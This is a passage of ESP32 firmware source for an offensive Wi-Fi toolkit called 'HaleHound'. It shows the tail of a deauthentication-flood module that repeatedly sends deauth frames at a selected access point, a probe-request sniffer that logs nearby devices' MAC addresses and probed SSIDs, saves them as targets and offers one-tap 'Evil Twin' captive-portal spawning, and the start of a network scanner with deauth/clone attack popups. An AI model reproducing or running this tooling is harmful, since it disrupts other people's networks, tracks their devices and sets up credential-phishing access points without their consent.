                        successCount = 0;
                        consecutiveFailures = 0;
                        lastPacketTime = 0;
                        skullFrame = 0;
                    } else {
                        // Stopping attack
                        lastPacketTime = 0;
                    }
                    drawAttackScreen();
                    delay(50);
                }
                // Back button: x=177-234
                else if (tx >= 177 && tx <= 234) {
                    drawButton(177, 304, 57, 16, "Back", true, false);
                    attackRunning = false;
                    lastPacketTime = 0;
                    selectedApIndex = -1;
                    exitAttackMode();  // Tear down raw ESP-IDF so Arduino scan works
                    scanNetworks();    // Rescan with Arduino WiFi
                    drawScanScreen();
                    delay(50);
                }
            }
        }

        // Hardware button handling
        if (buttonPressed(BTN_SELECT)) {
            attackRunning = !attackRunning;
            if (attackRunning) {
                packetCount = 0;
                successCount = 0;
                consecutiveFailures = 0;
                skullFrame = 0;
            }
            drawAttackScreen();
        }

        if (buttonPressed(BTN_LEFT)) {
            if (packetsPerBurst > 1) {
                packetsPerBurst -= (packetsPerBurst >= 10) ? 5 : 1;
                if (packetsPerBurst < 1) packetsPerBurst = 1;
                drawAttackScreen();
            }
        }

        if (buttonPressed(BTN_RIGHT)) {
            if (packetsPerBurst < 100) {
                packetsPerBurst += (packetsPerBurst >= 10) ? 5 : 1;
                if (packetsPerBurst > 100) packetsPerBurst = 100;
                drawAttackScreen();
            }
        }

        if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
            attackRunning = false;
            selectedApIndex = -1;
            exitAttackMode();  // Tear down raw ESP-IDF so Arduino scan works
            scanNetworks();    // Rescan with Arduino WiFi
            drawScanScreen();
        }

        // Attack packet transmission - MATCHES ORIGINAL
        if (attackRunning) {
            uint32_t now = millis();

            if (ESP.getFreeHeap() < 20000) {
                attackRunning = false;
                drawAttackScreen();
                return;
            }

            if (consecutiveFailures > 10) {
                esp_wifi_stop();
                delay(200);
                esp_wifi_start();
                delay(200);
                consecutiveFailures = 0;
            }

            if (now - lastPacketTime >= 100) {
                for (int i = 0; i < packetsPerBurst && attackRunning; i++) {
                    sendDeauthFrame(&selectedAp, selectedChannel);
                    if (i < packetsPerBurst - 1) delay(1);
                }
                lastPacketTime = now;

                // Update skull spinner animation - MATCHES ORIGINAL
                drawSkullSpinner();
                drawSpinnerLabel();

                // Update stats display periodically (less frequently for performance)
                static uint32_t lastStatsUpdate = 0;
                if (now - lastStatsUpdate >= 500) {
                    updateAttackStats();
                    lastStatsUpdate = now;
                }
            }
        }
    }
}

int getNetworkCount() { return networkCount; }
void selectTarget(int index) {
    if (index >= 0 && index < networkCount) {
        selectedApIndex = index;
        selectedAp = apList[index];
        selectedChannel = apList[index].primary;
    }
}
int getSelectedTarget() { return selectedApIndex; }
void startAttack() { attackRunning = true; }
void stopAttack() { attackRunning = false; }
bool isAttackRunning() { return attackRunning; }
uint32_t getPacketCount() { return packetCount; }
uint32_t getSuccessCount() { return successCount; }
float getSuccessRate() { return (packetCount > 0) ? (float)successCount / packetCount * 100 : 0; }
void setPacketsPerBurst(int count) { packetsPerBurst = constrain(count, 1, 100); }
int getPacketsPerBurst() { return packetsPerBurst; }
bool isExitRequested() { return exitRequested; }

// Set target from WifiScan handoff - skips scan screen
void setTarget(const char* bssid, const char* ssid, int channel) {
    // Parse BSSID string "AA:BB:CC:DD:EE:FF" into bytes
    unsigned int b[6];
    if (sscanf(bssid, "%02X:%02X:%02X:%02X:%02X:%02X",
               &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) == 6) {
        for (int i = 0; i < 6; i++) {
            selectedAp.bssid[i] = (uint8_t)b[i];
        }
    }

    // Copy SSID
    strncpy((char*)selectedAp.ssid, ssid, 32);
    selectedAp.ssid[32] = '\0';

    // Set channel and auth (assume WPA2 for display)
    selectedAp.primary = channel;
    selectedAp.authmode = WIFI_AUTH_WPA2_PSK;

    // Mark as pre-set target
    selectedChannel = channel;
    selectedApIndex = 0;  // Valid index so attack screen shows
    targetPreset = true;

    #if CYD_DEBUG
    Serial.printf("[DEAUTH] Target preset: %s on ch%d\n", ssid, channel);
    #endif
}

void cleanup() {
    attackRunning = false;
    if (inAttackMode) {
        exitAttackMode();  // Tear down raw ESP-IDF first
    }
    if (apList) {
        free(apList);
        apList = nullptr;
    }
    networkCount = 0;
    selectedApIndex = -1;
    targetPreset = false;
    WiFi.mode(WIFI_OFF);  // Clean shutdown so next module starts fresh
    delay(50);
    initialized = false;
    exitRequested = false;

    #if CYD_DEBUG
    Serial.println("[DEAUTH] Cleanup complete");
    #endif
}

}  // namespace Deauther


// ═══════════════════════════════════════════════════════════════════════════
// DEAUTH DETECT IMPLEMENTATION
// ═══════════════════════════════════════════════════════════════════════════

namespace DeauthDetect {
// ═══════════════════════════════════════════════════════════════════════════
// PROBE REQUEST SNIFFER - Captures devices looking for networks
// Shows what SSIDs devices are probing for (recon gold!)
// ═══════════════════════════════════════════════════════════════════════════
//
// HaleHound v2.6.2 UPGRADE - February 2026
// - Tap to Spawn Evil Twin (tap SSID → launch Captive Portal with that name)
// - Filter View (ALL/SSID/NEW toggle)
// - Save Targets (Preferences-based)
// ═══════════════════════════════════════════════════════════════════════════

#define MAX_DEVICES 30
#define MAX_SSIDS 50
#define MAX_PROBES 100
#define MAX_LINES 12
#define LINE_HEIGHT 16
#define LIST_START_Y 52  // Below stats (y=38+12=50), +2 padding

// Filter modes for probe display
enum FilterMode {
    FILTER_ALL,    // Show all probes (default)
    FILTER_SSID,   // Show unique SSIDs only
    FILTER_NEW     // Show only new devices (pink)
};

// Probe entry structure (stores both MAC and SSID separately for tapping)
struct ProbeEntry {
    char mac[18];      // MAC string "XX:XX:XX"
    char ssid[33];     // Full SSID
    uint16_t color;    // Display color (pink=new, cyan=repeat)
    bool isNew;        // Was this a new device?
};

// State variables
static bool initialized = false;
static bool exitRequested = false;
static bool sniffing = false;
static int currentChannel = 1;
static FilterMode currentFilter = FILTER_ALL;

// Evil Twin handoff - selected SSID to pass to CaptivePortal
static char selectedSSID[33] = "";
static bool evilTwinRequested = false;

// Popup state
static bool popupActive = false;
static int popupIndex = -1;

// Tracked devices (unique MACs - full 6 bytes)
static uint8_t deviceMACs[MAX_DEVICES][6];
static int deviceCount = 0;

// Tracked SSIDs (unique probe targets)
static String probedSSIDs[MAX_SSIDS];
static int ssidCount = 0;

// Probe log with full data (for tapping)
static ProbeEntry probeEntries[MAX_LINES];
static int probeLogIndex = 0;
static int totalProbes = 0;

// Saved targets (Preferences-based persistence)
static Preferences targetPrefs;
#define MAX_SAVED_TARGETS 10

// For thread-safe probe capture
static volatile bool newProbeReady = false;
static char lastProbeMAC[18];
static char lastProbeSSID[33];
static uint8_t lastFullMAC[6];  // Store full MAC for proper tracking

// Check if device MAC already tracked (compares full 6-byte MAC)
static bool isDeviceKnown(uint8_t* mac) {
    for (int i = 0; i < deviceCount; i++) {
        if (memcmp(mac, deviceMACs[i], 6) == 0) return true;
    }
    return false;
}

// Add device to tracked list
static void addDevice(uint8_t* mac) {
    if (deviceCount < MAX_DEVICES && !isDeviceKnown(mac)) {
        memcpy(deviceMACs[deviceCount], mac, 6);
        deviceCount++;
    }
}

// Check if SSID already tracked
static bool isSSIDKnown(const char* ssid) {
    for (int i = 0; i < ssidCount; i++) {
        if (probedSSIDs[i] == ssid) return true;
    }
    return false;
}

// Add SSID to tracked list
static void addSSID(const char* ssid) {
    if (ssidCount < MAX_SSIDS && !isSSIDKnown(ssid) && strlen(ssid) > 0) {
        probedSSIDs[ssidCount] = String(ssid);
        ssidCount++;
    }
}

// Add probe to display log (stores full data for tap-to-spawn)
static void addProbeToLog(const char* mac, const char* ssid, bool newDevice) {
    // Scroll if full
    if (probeLogIndex >= MAX_LINES) {
        for (int i = 0; i < MAX_LINES - 1; i++) {
            probeEntries[i] = probeEntries[i + 1];
        }
        probeLogIndex = MAX_LINES - 1;
    }

    // Store full data in struct
    strncpy(probeEntries[probeLogIndex].mac, mac, 17);
    probeEntries[probeLogIndex].mac[17] = '\0';
    strncpy(probeEntries[probeLogIndex].ssid, ssid, 32);
    probeEntries[probeLogIndex].ssid[32] = '\0';
    probeEntries[probeLogIndex].color = newDevice ? 0xF81F : 0x07FF;
    probeEntries[probeLogIndex].isNew = newDevice;
    probeLogIndex++;
}

// ═══════════════════════════════════════════════════════════════════════════
// SAVED TARGETS (Preferences-based persistence)
// ═══════════════════════════════════════════════════════════════════════════

static void saveTarget(const char* mac, const char* ssid) {
    targetPrefs.begin("hh_targets", false);
    int count = targetPrefs.getUInt("count", 0);
    if (count >= MAX_SAVED_TARGETS) {
        targetPrefs.end();
        return;  // Full
    }
    // Format: "MAC|SSID"
    char key[12];
    char value[52];
    snprintf(key, sizeof(key), "t%d", count);
    snprintf(value, sizeof(value), "%s|%s", mac, ssid);
    targetPrefs.putString(key, value);
    targetPrefs.putUInt("count", count + 1);
    targetPrefs.end();
}

static int getSavedTargetCount() {
    targetPrefs.begin("hh_targets", true);
    int count = targetPrefs.getUInt("count", 0);
    targetPrefs.end();
    return count;
}

// ═══════════════════════════════════════════════════════════════════════════
// FORWARD DECLARATIONS (needed for popup functions)
// ═══════════════════════════════════════════════════════════════════════════
static void drawProbeUI();
static void drawHeader();
static void drawStats();
static void drawProbeLog();

// ═══════════════════════════════════════════════════════════════════════════
// EVIL TWIN POPUP
// ═══════════════════════════════════════════════════════════════════════════

static void showEvilTwinPopup(int index) {
    if (index < 0 || index >= probeLogIndex) return;

    // Don't show popup for broadcast or system messages
    if (strcmp(probeEntries[index].ssid, "[BROADCAST]") == 0) return;
    if (strcmp(probeEntries[index].mac, "---") == 0) return;

    popupActive = true;
    popupIndex = index;
    sniffing = false;  // Pause sniffing while popup is active

    // Draw popup overlay
    int popupX = 20;
    int popupY = 80;
    int popupW = SCREEN_WIDTH - 40;
    int popupH = 120;

    // Background with border
    tft.fillRect(popupX, popupY, popupW, popupH, HALEHOUND_BLACK);
    tft.drawRect(popupX, popupY, popupW, popupH, HALEHOUND_HOTPINK);
    tft.drawRect(popupX + 1, popupY + 1, popupW - 2, popupH - 2, HALEHOUND_MAGENTA);

    // Title
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setTextSize(1);
    tft.setCursor(popupX + 10, popupY + 10);
    tft.print("SPAWN EVIL TWIN?");

    // SSID name (truncate if needed)
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setTextSize(2);
    tft.setCursor(popupX + 10, popupY + 30);
    char displaySSID[16];
    strncpy(displaySSID, probeEntries[index].ssid, 15);
    displaySSID[15] = '\0';
    tft.print(displaySSID);

    // Buttons
    int btnY = popupY + 75;
    int btnW = 70;
    int btnH = 30;

    // YES button (left)
    tft.fillRoundRect(popupX + 15, btnY, btnW, btnH, 5, HALEHOUND_DARK);
    tft.drawRoundRect(popupX + 15, btnY, btnW, btnH, 5, 0x07E0);  // Green
    tft.setTextColor(0x07E0);
    tft.setTextSize(2);
    tft.setCursor(popupX + 30, btnY + 8);
    tft.print("YES");

    // NO button (right)
    tft.fillRoundRect(popupX + popupW - 85, btnY, btnW, btnH, 5, HALEHOUND_DARK);
    tft.drawRoundRect(popupX + popupW - 85, btnY, btnW, btnH, 5, 0xF800);  // Red
    tft.setTextColor(0xF800);
    tft.setCursor(popupX + popupW - 65, btnY + 8);
    tft.print("NO");

    tft.setTextSize(1);
}

static bool handlePopupTouch(uint16_t tx, uint16_t ty) {
    if (!popupActive) return false;

    int popupX = 20;
    int popupY = 80;
    int popupW = SCREEN_WIDTH - 40;
    int btnY = popupY + 75;
    int btnW = 70;
    int btnH = 30;

    // YES button
    if (tx >= popupX + 15 && tx <= popupX + 15 + btnW &&
        ty >= btnY && ty <= btnY + btnH) {
        // Store selected SSID for handoff
        strncpy(selectedSSID, probeEntries[popupIndex].ssid, 32);
        selectedSSID[32] = '\0';
        evilTwinRequested = true;
        popupActive = false;
        exitRequested = true;
        return true;
    }

    // NO button
    if (tx >= popupX + popupW - 85 && tx <= popupX + popupW - 85 + btnW &&
        ty >= btnY && ty <= btnY + btnH) {
        popupActive = false;
        popupIndex = -1;
        sniffing = true;  // Resume sniffing
        // Redraw screen
        tft.fillScreen(HALEHOUND_BLACK);
        drawStatusBar();
        drawProbeUI();
        drawHeader();
        drawStats();
        drawProbeLog();
        return true;
    }

    return false;
}

// Promiscuous callback - capture probe requests
static void IRAM_ATTR snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!sniffing || exitRequested) return;
    if (newProbeReady) return;  // Still processing last one

    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t* payload = pkt->payload;

    // Only want management frames
    if (type != WIFI_PKT_MGMT) return;

    // Check frame type - 0x40 = Probe Request
    uint8_t frameType = payload[0] & 0xFC;
    if (frameType != 0x40) return;

    // Extract source MAC (offset 10) - store FULL MAC for proper tracking
    memcpy(lastFullMAC, payload + 10, 6);

    // Format MAC for display (last 3 octets to save space)
    snprintf(lastProbeMAC, sizeof(lastProbeMAC), "%02X:%02X:%02X",
             lastFullMAC[3], lastFullMAC[4], lastFullMAC[5]);

    // Extract SSID from tagged parameters (offset 24+)
    // Tag 0 = SSID, next byte = length
    int pos = 24;
    int frameLen = pkt->rx_ctrl.sig_len;

    lastProbeSSID[0] = '\0';  // Default empty

    while (pos < frameLen - 2) {
        uint8_t tagNum = payload[pos];
        uint8_t tagLen = payload[pos + 1];

        if (tagNum == 0) {  // SSID tag
            if (tagLen > 0 && tagLen < 32) {
                memcpy(lastProbeSSID, payload + pos + 2, tagLen);
                lastProbeSSID[tagLen] = '\0';
            } else {
                strcpy(lastProbeSSID, "[BROADCAST]");
            }
            break;
        }
        pos += 2 + tagLen;
    }

    if (lastProbeSSID[0] == '\0') {
        strcpy(lastProbeSSID, "[BROADCAST]");
    }

    newProbeReady = true;
    totalProbes++;
}

// ═══════════════════════════════════════════════════════════════════════════
// UI DRAWING
// ═══════════════════════════════════════════════════════════════════════════

static void drawProbeUI() {
#define PR_ICON_SIZE 16
    int iconY = 0;

    // Icon bar background — starts at top (no status bar)
    tft.fillRect(0, 0, SCREEN_WIDTH, 16, HALEHOUND_DARK);

    // Back icon - cyan
    tft.drawBitmap(10, iconY, bitmap_icon_go_back, PR_ICON_SIZE, PR_ICON_SIZE, 0x07FF);

    // Status text - shows "PROBE" when sniffing, "PAUSED" when not
    tft.setTextSize(1);
    tft.setCursor(35, iconY + 4);
    if (sniffing) {
        tft.setTextColor(0x07FF, HALEHOUND_DARK);  // Cyan when active
        tft.print("PRB");
        tft.print(currentChannel);
    } else {
        tft.setTextColor(0xF81F, HALEHOUND_DARK);  // Pink when paused
        tft.print("PAUSE");
    }

    // Filter button (x=90) - shows current filter mode
    tft.setCursor(90, iconY + 4);
    switch (currentFilter) {
        case FILTER_ALL:
            tft.setTextColor(0x07FF, HALEHOUND_DARK);
            tft.print("ALL");
            break;
        case FILTER_SSID:
            tft.setTextColor(0xFFE0, HALEHOUND_DARK);  // Yellow
            tft.print("SSID");
            break;
        case FILTER_NEW:
            tft.setTextColor(0xF81F, HALEHOUND_DARK);  // Pink
            tft.print("NEW");
            break;
    }

    // STAR icon for saved targets count (x=130)
    tft.setCursor(130, iconY + 4);
    tft.setTextColor(0xFFE0, HALEHOUND_DARK);  // Yellow
    tft.print("*");
    tft.print(getSavedTargetCount());

    // CLR button (x=160)
    tft.setCursor(160, iconY + 4);
    tft.setTextColor(0x07FF, HALEHOUND_DARK);
    tft.print("CLR");

    // Power icon - pink=stopped, cyan=running
    uint16_t powerColor = sniffing ? 0x07FF : 0xF81F;
    tft.drawBitmap(210, iconY, bitmap_icon_power, PR_ICON_SIZE, PR_ICON_SIZE, powerColor);

    // Separator line - hot pink
    tft.drawLine(0, 16, SCREEN_WIDTH, 16, 0xF81F);
}

// Glitch title — below icon bar (separator at y=16)
static void drawHeader() {
    drawGlitchText(35, "PROBE SNIFF", &Nosifer_Regular10pt7b);
}

static void drawStats() {
    // Stats line below glitch title
    tft.fillRect(0, 38, SCREEN_WIDTH, 12, HALEHOUND_BLACK);
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(5, 40);
    tft.print("D:");
    tft.print(deviceCount);
    tft.setCursor(50, 40);
    tft.print("S:");
    tft.print(ssidCount);
    tft.setCursor(95, 40);
    tft.print("P:");
    tft.print(totalProbes);
}

static void drawProbeLog() {
    // Clear log area
    tft.fillRect(0, LIST_START_Y, SCREEN_WIDTH, SCREEN_HEIGHT - LIST_START_Y, HALEHOUND_BLACK);

    // Draw log entries based on filter mode
    int y = LIST_START_Y + 2;
    int displayed = 0;

    for (int i = 0; i < probeLogIndex && displayed < MAX_LINES; i++) {
        // Apply filter
        if (currentFilter == FILTER_NEW && !probeEntries[i].isNew) continue;
        if (currentFilter == FILTER_SSID) {
            // Skip if this SSID was already displayed
            bool duplicate = false;
            for (int j = 0; j < i; j++) {
                if (strcmp(probeEntries[i].ssid, probeEntries[j].ssid) == 0) {
                    duplicate = true;
                    break;
                }
            }
            if (duplicate) continue;
        }

        // Format entry: "XX:XX:XX->SSID"
        char entry[40];
        char truncSSID[20];
        strncpy(truncSSID, probeEntries[i].ssid, 19);
        truncSSID[19] = '\0';
        snprintf(entry, sizeof(entry), "%s->%s", probeEntries[i].mac, truncSSID);

        tft.setTextColor(probeEntries[i].color);
        tft.setCursor(5, y);
        tft.print(entry);
        y += LINE_HEIGHT;
        displayed++;
    }

    // Show hint if no entries
    if (displayed == 0 && probeLogIndex == 0) {
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(5, y);
        tft.print("Tap entry to spawn Evil Twin");
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// MAIN FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

void setup() {
    #if CYD_DEBUG
    Serial.println("[PROBE] Initializing Probe Sniffer v2.0...");
    #endif

    // Always redraw screen on entry
    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();

    // Reset state
    deviceCount = 0;
    ssidCount = 0;
    probeLogIndex = 0;
    totalProbes = 0;
    newProbeReady = false;
    sniffing = true;
    exitRequested = false;
    currentChannel = 1;
    currentFilter = FILTER_ALL;
    popupActive = false;
    popupIndex = -1;
    evilTwinRequested = false;
    selectedSSID[0] = '\0';

    // Clear arrays
    memset(deviceMACs, 0, sizeof(deviceMACs));
    memset(lastFullMAC, 0, sizeof(lastFullMAC));
    memset(probeEntries, 0, sizeof(probeEntries));
    for (int i = 0; i < MAX_SSIDS; i++) probedSSIDs[i] = "";

    // Draw UI
    drawProbeUI();
    drawHeader();
    drawStats();

    // Initial messages
    addProbeToLog("---", "Probe Sniffer v2.0", false);
    addProbeToLog("---", "Tap entry for Evil Twin", false);
    drawProbeLog();

    // ALWAYS set up promiscuous mode (other modules may have disabled it)
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(snifferCallback);
    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);

    initialized = true;

    #if CYD_DEBUG
    Serial.println("[PROBE] Ready - sniffing probes");
    #endif
}

void loop() {
    if (!initialized) return;

    touchButtonsUpdate();

    // ═══════════════════════════════════════════════════════════════════════
    // TOUCH HANDLING
    // ═══════════════════════════════════════════════════════════════════════
    uint16_t tx, ty;
    if (getTouchPoint(&tx, &ty)) {
        // Handle popup first if active
        if (popupActive) {
            while (isTouched()) { delay(10); }
            handlePopupTouch(tx, ty);
            return;
        }

        // Icon bar area (y=0-18) — icons drawn at y=0, separator at y=16
        if (ty >= 0 && ty <= 18) {
            while (isTouched()) { delay(10); }  // Wait for release

            // Back icon at x=5-35
            if (tx >= 5 && tx <= 35) {
                if (sniffing) {
                    sniffing = false;
                    addProbeToLog("---", "PAUSED - tap back to exit", false);
                    drawProbeUI();
                    drawProbeLog();
                } else {
                    exitRequested = true;
                }
                return;
            }
            // Filter button (x=85-120)
            else if (tx >= 85 && tx <= 120) {
                // Cycle filter mode
                if (currentFilter == FILTER_ALL) {
                    currentFilter = FILTER_SSID;
                } else if (currentFilter == FILTER_SSID) {
                    currentFilter = FILTER_NEW;
                } else {
                    currentFilter = FILTER_ALL;
                }
                drawProbeUI();
                drawProbeLog();
                return;
            }
            // CLR button area (x=155-185)
            else if (tx >= 155 && tx <= 185) {
                deviceCount = 0;
                ssidCount = 0;
                probeLogIndex = 0;
                totalProbes = 0;
                memset(deviceMACs, 0, sizeof(deviceMACs));
                for (int i = 0; i < MAX_SSIDS; i++) probedSSIDs[i] = "";
                memset(probeEntries, 0, sizeof(probeEntries));
                addProbeToLog("---", "Cleared", false);
                drawStats();
                drawProbeLog();
                return;
            }
            // Power/Stop icon at right edge
            else if (tx >= (tft.width() - 35) && tx <= tft.width()) {
                sniffing = !sniffing;
                if (sniffing) {
                    addProbeToLog("---", "RESUMED", false);
                } else {
                    addProbeToLog("---", "STOPPED", false);
                }
                drawProbeUI();
                drawProbeLog();
                return;
            }
        }

        // ═══════════════════════════════════════════════════════════════════
        // PROBE LOG TAP DETECTION (y > LIST_START_Y)
        // ═══════════════════════════════════════════════════════════════════
        if (ty > LIST_START_Y && ty < SCREEN_HEIGHT) {
            // Calculate which entry was tapped
            int tappedIndex = (ty - LIST_START_Y - 2) / LINE_HEIGHT;

            // Adjust for filter - need to find actual index
            int displayedIndex = 0;
            int actualIndex = -1;
            for (int i = 0; i < probeLogIndex; i++) {
                if (currentFilter == FILTER_NEW && !probeEntries[i].isNew) continue;
                if (currentFilter == FILTER_SSID) {
                    bool duplicate = false;
                    for (int j = 0; j < i; j++) {
                        if (strcmp(probeEntries[i].ssid, probeEntries[j].ssid) == 0) {
                            duplicate = true;
                            break;
                        }
                    }
                    if (duplicate) continue;
                }
                if (displayedIndex == tappedIndex) {
                    actualIndex = i;
                    break;
                }
                displayedIndex++;
            }

            if (actualIndex >= 0 && actualIndex < probeLogIndex) {
                // Check for long press (save target)
                unsigned long pressStart = millis();
                while (isTouched() && (millis() - pressStart) < 800) {
                    delay(10);
                }

                if (millis() - pressStart >= 800) {
                    // Long press - save target
                    saveTarget(probeEntries[actualIndex].mac, probeEntries[actualIndex].ssid);
                    // Flash confirmation
                    tft.fillRect(0, SCREEN_HEIGHT - 20, SCREEN_WIDTH, 20, 0x07E0);
                    tft.setTextColor(HALEHOUND_BLACK);
                    tft.setCursor(10, SCREEN_HEIGHT - 15);
                    tft.print("TARGET SAVED!");
                    delay(500);
                    drawProbeUI();  // Refresh star count
                    drawProbeLog();
                } else {
                    // Short tap - show Evil Twin popup
                    while (isTouched()) { delay(10); }
                    showEvilTwinPopup(actualIndex);
                }
                return;
            }
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    // PROCESS CAPTURED PROBES
    // ═══════════════════════════════════════════════════════════════════════
    if (newProbeReady && !popupActive) {
        // Check if this is a new device (using full MAC now)
        bool isNew = !isDeviceKnown(lastFullMAC);
        if (isNew) {
            addDevice(lastFullMAC);
        }

        // Track SSID if not broadcast
        if (strcmp(lastProbeSSID, "[BROADCAST]") != 0) {
            addSSID(lastProbeSSID);
        }

        // Add to display log
        addProbeToLog(lastProbeMAC, lastProbeSSID, isNew);

        // Update display
        drawStats();
        drawProbeLog();

        newProbeReady = false;

        #if CYD_DEBUG
        Serial.printf("[PROBE] %s -> %s %s\n", lastProbeMAC, lastProbeSSID, isNew ? "(NEW)" : "");
        #endif
    }

    // ═══════════════════════════════════════════════════════════════════════
    // CHANNEL HOPPING - Every 300ms for good coverage
    // ═══════════════════════════════════════════════════════════════════════
    static uint32_t lastChannelHop = 0;
    if (sniffing && millis() - lastChannelHop > 300) {
        currentChannel = (currentChannel % 13) + 1;
        esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
        lastChannelHop = millis();

        // Update channel display in icon bar
        drawProbeUI();
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// PUBLIC FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

void startScanning() { sniffing = true; }
void stopScanning() { sniffing = false; }
bool isScanning() { return sniffing; }
int getDeviceCount() { return deviceCount; }
int getSSIDCount() { return ssidCount; }
int getProbeCount() { return totalProbes; }
bool isExitRequested() { return exitRequested; }

// Evil Twin handoff functions
const char* getSelectedSSID() { return selectedSSID; }
bool isEvilTwinRequested() { return evilTwinRequested; }
void clearEvilTwinRequest() {
    evilTwinRequested = false;
    selectedSSID[0] = '\0';
}

void cleanup() {
    esp_wifi_set_promiscuous(false);
    WiFi.disconnect();
    sniffing = false;
    initialized = false;
    exitRequested = false;
    evilTwinRequested = false;
    selectedSSID[0] = '\0';
    popupActive = false;

    #if CYD_DEBUG
    Serial.println("[PROBE] Cleanup complete");
    #endif
}

}  // namespace DeauthDetect


// ═══════════════════════════════════════════════════════════════════════════
// WIFI SCAN IMPLEMENTATION
// ═══════════════════════════════════════════════════════════════════════════

namespace WifiScan {
// ═══════════════════════════════════════════════════════════════════════════
// WIFI SCANNER v2.0 - HaleHound Edition
// Tap-to-Attack, Sort, Filter, Signal Bars
// ═══════════════════════════════════════════════════════════════════════════

#define MAX_VISIBLE_ITEMS 11
#define LIST_ITEM_HEIGHT 17
#define MAX_NETWORKS 50

// Sort modes
enum SortMode {
    SORT_RSSI,     // Strongest signal first
    SORT_CHANNEL,  // By channel number
    SORT_ENC,      // By encryption (Open first)
    SORT_ALPHA     // Alphabetical
};

// Filter modes
enum FilterMode {
    FILT_ALL,      // Show all networks
    FILT_OPEN,     // Open networks only
    FILT_WEP,      // WEP only
    FILT_WPA       // WPA/WPA2 only
};

// State variables
static bool initialized = false;
static bool exitRequested = false;
static bool isScanning = false;
static bool detailView = false;
static bool wardrivingEnabled = false;

static int currentIndex = 0;
static int listStartIndex = 0;
static int networkCount = 0;

// Sort and filter state
static SortMode currentSort = SORT_RSSI;
static FilterMode currentFilter = FILT_ALL;
static int sortedIndices[MAX_NETWORKS];
static int filteredCount = 0;

// Attack popup state
static bool attackPopupActive = false;
static int attackPopupIndex = -1;

// Attack handoff - for Deauther or CaptivePortal
static char selectedSSID[33] = "";
static char selectedBSSID[18] = "";
static int selectedChannel = 0;
static bool deauthRequested = false;
static bool cloneRequested = false;

// Forward declarations
static void drawList();
static void drawWifiScanUI();

// ═══════════════════════════════════════════════════════════════════════════
// SORTING AND FILTERING
// ═══════════════════════════════════════════════════════════════════════════

static void sortAndFilterNetworks() {
    filteredCount = 0;

    // First pass: apply filter and collect indices
    for (int i = 0; i < networkCount && filteredCount < MAX_NETWORKS; i++) {
        int enc = WiFi.encryptionType(i);
        bool include = true;

        switch (currentFilter) {
            case FILT_OPEN:
                include = (enc == WIFI_AUTH_OPEN);
                break;
            case FILT_WEP:
                include = (enc == WIFI_AUTH_WEP);
                break;
            case FILT_WPA:
                include = (enc == WIFI_AUTH_WPA_PSK || enc == WIFI_AUTH_WPA2_PSK ||
                          enc == WIFI_AUTH_WPA_WPA2_PSK || enc == WIFI_AUTH_WPA2_ENTERPRISE);
                break;
            default:
                include = true;
        }

        if (include) {
            sortedIndices[filteredCount++] = i;
        }
    }

    // Second pass: sort the filtered indices
    for (int i = 0; i < filteredCount - 1; i++) {
        for (int j = i + 1; j < filteredCount; j++) {
            bool swap = false;
            int a = sortedIndices[i];
            int b = sortedIndices[j];

            switch (currentSort) {
                case SORT_RSSI:
                    swap = WiFi.RSSI(b) > WiFi.RSSI(a);
                    break;
                case SORT_CHANNEL:
                    swap = WiFi.channel(a) > WiFi.channel(b);
                    break;
                case SORT_ENC:
                    swap = WiFi.encryptionType(a) > WiFi.encryptionType(b);
                    break;
                case SORT_ALPHA:
                    swap = WiFi.SSID(a) > WiFi.SSID(b);
                    break;
            }

            if (swap) {
                int tmp = sortedIndices[i];
                sortedIndices[i] = sortedIndices[j];
                sortedIndices[j] = tmp;
            }
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// SIGNAL BARS - Color coded strength indicator
// ═══════════════════════════════════════════════════════════════════════════

static void drawSignalBars(int x, int y, int rssi) {
    // Convert RSSI to 0-4 bars
    int bars = 0;
    if (rssi >= -50) bars = 4;
    else if (rssi >= -60) bars = 3;
    else if (rssi >= -70) bars = 2;
    else if (rssi >= -80) bars = 1;

    // Color: green=strong, yellow=medium, red=weak
    uint16_t color;
    if (bars >= 3) color = 0x07E0;      // Green
    else if (bars >= 2) color = 0xFFE0; // Yellow
    else color = 0xF800;                 // Red

    // Draw bars (each bar is 3px wide, heights: 3,5,7,9)
    int barX = x;
    for (int i = 0; i < 4; i++) {
        int barH = 3 + (i * 2);
        int barY = y + (9 - barH);
        if (i < bars) {
            tft.fillRect(barX, barY, 3, barH, color);
        } else {
            tft.fillRect(barX, barY, 3, barH, HALEHOUND_GUNMETAL);
        }
        barX += 4;
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// ATTACK POPUP - DEAUTH / CLONE / CANCEL
// ═══════════════════════════════════════════════════════════════════════════

static void showAttackPopup(int index) {
    if (index < 0 || index >= filteredCount) return;

    int realIdx = sortedIndices[index];
    String ssid = WiFi.SSID(realIdx);
    if (ssid.length() == 0) ssid = "(Hidden)";

    attackPopupActive = true;
    attackPopupIndex = index;

    // Popup dimensions
    int popupX = 15;
    int popupY = 70;
    int popupW = SCREEN_WIDTH - 30;
    int popupH = 150;

    // Background with double border (HaleHound style)
    tft.fillRect(popupX, popupY, popupW, popupH, HALEHOUND_BLACK);
    tft.drawRect(popupX, popupY, popupW, popupH, HALEHOUND_HOTPINK);
    tft.drawRect(popupX + 2, popupY + 2, popupW - 4, popupH - 4, HALEHOUND_MAGENTA);

    // Skull icon at top center
    tft.drawBitmap(popupX + (popupW/2) - 8, popupY + 8, bitmap_icon_skull_tools, 16, 16, HALEHOUND_HOTPINK);

    // Title
    tft.setTextColor(HALEHOUND_HOTPINK);
